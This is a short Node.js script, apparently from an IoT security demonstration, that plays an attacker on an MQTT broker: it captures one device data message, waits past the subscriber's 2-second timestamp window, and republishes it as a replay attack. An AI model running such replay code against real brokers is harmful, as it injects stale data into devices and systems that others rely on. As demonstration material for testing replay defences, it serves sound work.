import mqtt from 'mqtt';
import 'dotenv/config';

const BROKER_URL = process.env.MQTT_BROKER_URL || 'mqtt://localhost:1883';
const client = mqtt.connect(BROKER_URL, { clientId: 'attacker_replay' });

console.log('\x1b[31m😈 [ATTACK] REPLAY MODE: Sniffing...\x1b[0m');

client.on('connect', () => {
    client.subscribe('device/+/data');
});

client.on('message', (topic, message) => {
    client.unsubscribe('device/+/data'); // Grab one
    const stolenPacket = message.toString();

    console.log(`\x1b[31m⚡ [ATTACK] Stole packet. Waiting for timestamp expiry...\x1b[0m`);

    // Wait 3 seconds (Subscriber allows 2s)
    setTimeout(() => {
        console.log('\x1b[31m🔄 [ATTACK] Replaying old packet now!\x1b[0m');
        client.publish(topic, stolenPacket);
        setTimeout(() => process.exit(0), 500);
    }, 3000);
});